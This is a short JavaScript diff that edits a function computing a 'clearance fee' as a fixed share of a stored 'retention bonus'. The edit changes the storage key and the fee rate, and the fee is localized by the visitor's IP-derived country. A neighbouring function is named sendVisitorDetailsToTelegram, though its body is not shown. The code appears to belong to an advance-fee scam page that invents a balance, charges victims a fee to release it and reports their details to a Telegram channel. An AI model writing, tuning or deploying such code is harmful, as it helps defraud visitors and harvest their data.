@@ -468,7 +468,7 @@ async function sendVisitorDetailsToTelegram(ipData) {
 // ==========================================
 function loadLocalizedFee(ipData) {
     // 🎯 REPLACED WITH NEW SNAPSHOT KEY (falls back to av_retention_bonus if snap is not yet set)
-    const rawValue = localStorage.getItem("av_snap_retention_bonus") || localStorage.getItem("av_retention_bonus") || 0;
+    const rawValue = localStorage.getItem("av_converted_amount") || localStorage.getItem("av_retention_bonus") || 0;
     const baseAmount = parseFloat(rawValue);
 
     const countryCode = (ipData.country_code || 'US').toUpperCase();
@@ -493,7 +493,7 @@ function loadLocalizedFee(ipData) {
 
     localStorage.setItem("detected_region", regionLabel);
 
-    const clearanceFee = baseAmount * 0.2965;
+    const clearanceFee = baseAmount * 0.1176;
     const feeElement = document.getElementById("clearance_amount");
     if (feeElement) {
         feeElement.textContent = new Intl.NumberFormat(localeString, { 
